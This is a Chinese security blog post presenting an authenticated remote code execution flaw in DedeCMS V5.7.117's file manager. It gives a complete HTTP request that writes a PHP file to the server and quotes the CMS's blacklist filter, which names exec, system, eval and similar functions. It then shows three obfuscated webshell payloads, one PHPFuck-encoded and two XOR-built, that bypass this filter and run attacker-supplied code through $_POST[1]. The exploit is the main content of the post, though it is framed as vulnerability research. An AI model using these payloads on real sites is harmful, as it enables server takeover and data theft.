---
title: "DedeCMS V5.7.117（最新版） RCE"
source: https://mrxn.net/jswz/DedeCMS-V5_7_117-RCE.html
asset_dir: assets/dedecms-v5.7.117（最新版）-rce
---

# DedeCMS V5.7.117（最新版） RCE

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/22 08:36
- 1347浏览
- [2评论](#comment)
- 1小时阅读

深入探索

内容管理系统

网站管理系统

物流软件安全

---

# 漏洞简介

织梦[内容管理系统](#)(DedeCms) 以简单、实用、开源而闻名，是国内最知名的PHP开源网站管理系统，也是使用用户最多的PHP类CMS系统，在经历多年的发展，版本无论在功能，还是在易用性方面，都有了长足的发展和进步。`dede/file_manage_control.php` 参数 `str` 过滤不完善导致经过认证的用户可向系统写入任意内容到任意文件造成[RCE](https://mrxn.net/tag/rce)（绕过系统过滤）[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 影响版本

DedeCMS V5.7.117 （最新版，截至2025-02-19）

漏洞扫描服务

# 漏洞复现

[![DedeCMS V5.7.117（最新版） RCE](images/img-001-0debcaf7aebb.webp)](https://image.mrxn.net/5c87fa3498f7481abae9849f11dfc9ad.webp)

```
POST /dede/file_manage_control.php HTTP/1.1
Host: dede.test
Origin: http://dede.test
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Cookie: menuitems=1_1%2C2_1%2C3_1; PHPSESSID=2d1ca2ec9bc8151e93a7ed4c9d538f24; _csrf_name_bdcfd205=792906316d69f352fbea3d045e9d23f3; _csrf_name_bdcfd2051BH21ANI1AGD297L1FF21LN02BGE1DNG=b112b72b642019c7; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=0261997adf84f9f3; DedeLoginTime=1742303377; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=f56517b699cfd4af
Referer: http://dede.test/dede/file_manage_view.php?fmdo=newfile&activepath=
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Length: 168

fmdo=edit&backurl=&token=2b18c39c9a5fda9fea94ccaec24c62a7&activepath=&filename=cmd.php&str=%3C%3F%3Dmd5%28123456%29%3Bunlink%28__FILE__%29%3B&B1=++%E4%BF%9D+%E5%AD%98++
```

访问 dede.test/cmd.php 成功执行PHP代码

内容管理

[![DedeCMS V5.7.117（最新版） RCE](images/img-002-fa34c8e53841.webp)](https://image.mrxn.net/a46122d8afdc4a96b7bec9941853959f.webp)

# 漏洞分析

我们尝试写入[一句话](https://mrxn.net/tag/%E4%B8%80%E5%8F%A5%E8%AF%9D)webshell ,不出意外被拦截了

网络安全

[![DedeCMS V5.7.117（最新版） RCE](images/img-003-9781b4cf73c0.webp)](https://image.mrxn.net/ce4867ea1a394125b42e0c4e7c9a44b9.webp)

搜索关键词，往上回溯，看到了拦截[代码](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81)

深入探索

恶意软件分析工具

SQL注入防护

文本剥离工具

```
// 不允许这些字符
$str = preg_replace("#(/\*)[\s\S]*(\*/)#i", '', $str);

global $cfg_disable_funs;
$cfg_disable_funs = isset($cfg_disable_funs) ? $cfg_disable_funs : 'phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,fsockopen,fopen,fwrite,preg_replace';
$cfg_disable_funs = $cfg_disable_funs.',[$]GLOBALS,[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,require,create_function,array_map,call_user_func,call_user_func_array,array_filert,getallheaders';
foreach (explode(",", $cfg_disable_funs) as $value) {
    $value = str_replace(" ", "", $value);
    if(!empty($value) && preg_match("#[^a-z]+['\"]*{$value}['\"]*[\s]*[([{']#i", " {$str}") == TRUE) {
        $str = dede_htmlspecialchars($str);
        die("DedeCMS提示：当前页面中存在恶意代码！<pre>{$str}</pre>");
    }
}
```

- 过滤内容中所有多行注释
- 动态黑名单拦截含 **高危函数调用**（如 eval`,`system`,`popen）
- **超级全局变量操作**（如 `$_GET`/`$_POST`）
- **敏感代码（fwrite`,`fopen）特征** 的输入字符串，若匹配则对内容转义后终止程序
- **动态执行函数**：`call_user_func`, `create_function`
- 匹配 `$GLOBALS`、`$_POST` 等变量访问
- 匹配函数名后跟随括号（如 `eval(`、`system`）
- 兼容 `"eval"` 或 `'system'` 形式的字符串拼接绕过

但是比较搞笑的是过滤函数里的 `array_filert` ？？ [PHP](https://mrxn.net/tag/php) 里没有这个函数吧？或许是 `array_filter` ？程序员手滑拼写错误？

漏洞扫描服务

接下来看 另一段过滤判断

```
if(preg_match("#^[\s\S]+<\?(php|=)?[\s]+#i", " {$str}") == TRUE) {
    if(preg_match("#[$][_0-9a-z]+[\s]*[(][\s\S]*[)][\s]*[;]#iU", " {$str}") == TRUE) {
        $str = dede_htmlspecialchars($str);
        die("DedeCMS提示：当前页面中存在恶意代码！<pre>{$str}</pre>");
    }
    if(preg_match("#[@][$][_0-9a-z]+[\s]*[(][\s\S]*[)]#iU", " {$str}") == TRUE) {
        $str = dede_htmlspecialchars($str);
        die("DedeCMS提示：当前页面中存在恶意代码！<pre>{$str}</pre>");
    }
    if(preg_match("#[`][\s\S]*[`]#i", " {$str}") == TRUE) {
        $str = dede_htmlspecialchars($str);
        die("DedeCMS提示：当前页面中存在恶意代码！<pre>{$str}</pre>");
    }
}
```

主要匹配三种形式的动态代码执行特征

搜索引擎

- **PHP 开放标签**

> 匹配文件首部或嵌入段的 PHP 解析指令

```
<?php / <?= / <? + 空格
```

- **动态函数或变量调用**

```
$func();         // 动态函数（如 `$x();`）
@$func(参数);    // 错误抑制符 + 动态函数（如 `@$a($_POST)`）
```

- **反引号命令执行**

```
`命令`           // 系统命令调用（如 `rm -rf /`）
```

综合理解就是：如果输入内容同时包含 **PHP 起始标签** 和 **高危动态代码特征**，则判定为恶意代码并终止程序。

防病毒程序与恶意软件

但是基于字符串特征的就大概率被绕过，比如变形，编解码，加解密等等操作。

防病毒程序与恶意软件

直接使用公开的 `PHPFuck` 项目来对之前拦截的一句话小马 `@eval($_POST[1]);` 编码下

```
<?php ((([]^[]).[][[]]^([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]).(([].[])[([]^[[]])]).(([]^[]).[][[]]^([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]).(([].[])[([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[])]).(([]^[]).[][[]]^([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[])]^([].[])[([]^[[]])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[])]).(([]^[]).[][[]]^([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[]).[][[]]^([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[])]).(([]^[]).[][[]]^([].[])[([]^[])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[]).[][[]]^([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])]))(...((([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[])]).(([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[])]).(([].[])[([]^[[]])]).(([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[[]])+([]^[[]]).[][[]]^([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[]).[][[]]^([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[])]).(([]^[]).[][[]]^([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[])]).(([]^[]).[][[]]^([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])]))((([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[[]]).[][[]]^([].[])[([]^[[]])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]).((([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])]).(([]^[]).[][[]]^([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[]).[][[]]^([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])]).(([].[])[([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[]).[][[]]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[]).[][[]]^([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[[]]).[][[]]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[[]]).[][[]]^([].[])[([]^[[]])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[[]]).[][[]]).(([]^[]).[][[]]^([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[[]]).[][[]]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])]).(([]^[]).[][[]]^([].[])[([]^[[]])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])])).(([]^[[]]).[][[]]^([].[])[([]^[[]])]^([].[])[([]^[[]])+([]^[[]])+([]^[[]])])))() ?>
```

成功写入

[![DedeCMS V5.7.117（最新版） RCE](images/img-004-e1fb35d080e8.webp)](https://image.mrxn.net/b82a9c0099264fffb2ba351c55912da4.webp)

访问 cmd.php 并执行 `phpinfo()` 成功

[![DedeCMS V5.7.117（最新版） RCE](images/img-005-307556e02887.webp)](https://image.mrxn.net/719c93a6ff5c4fb2b7fc703cf441cbb0.webp)

或者使用PHP运算符来动态生成需要执行的函数名在调用

```
<? (("S" ^ "2") . ("I" ^ ":") . ("Y" ^ "*") . ("#" ^ "F") . ("A" ^ "3") . ("/" ^ "["))(${("h" ^ "7") . ("}" ^ "-") . ("o" ^ " ") . ("h" ^ ";") . ("q" ^ "%")}[1]);
```

[![DedeCMS V5.7.117（最新版） RCE](images/img-006-199c90f12b1a.webp)](https://image.mrxn.net/7c0f9423e5ee4b97b1d6f8395ab1c54c.webp)

也是可以成功上传的且成功执行的

[![DedeCMS V5.7.117（最新版） RCE](images/img-007-7891f5af0f15.webp)](https://image.mrxn.net/0fbd6380be3140718e8bb54ff00e9f35.webp)

亦或其他动态生成的亦或

```
<? @(("\xfa"^"\x9b").("\xab"^"\xd8").("K"^"8").("\x93"^"\xf6").("\xf6"^"\x84").("\xd3"^"\xa7"))(${("="^"b").("\xf8"^"\xa8").("%"^"j").("v"^"%").("\xde"^"\x8a")}[1]);
```

[![DedeCMS V5.7.117（最新版） RCE](images/img-008-9686c96aa133.webp)](https://image.mrxn.net/f2b9847eec6c4a4c8588ace0776eabdf.webp)

# 参考

- `https://splitline.github.io/PHPFuck/`

- 标签：
- [#代码](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81)
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#php](https://mrxn.net/tag/php)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.漏洞复现](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.参考](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
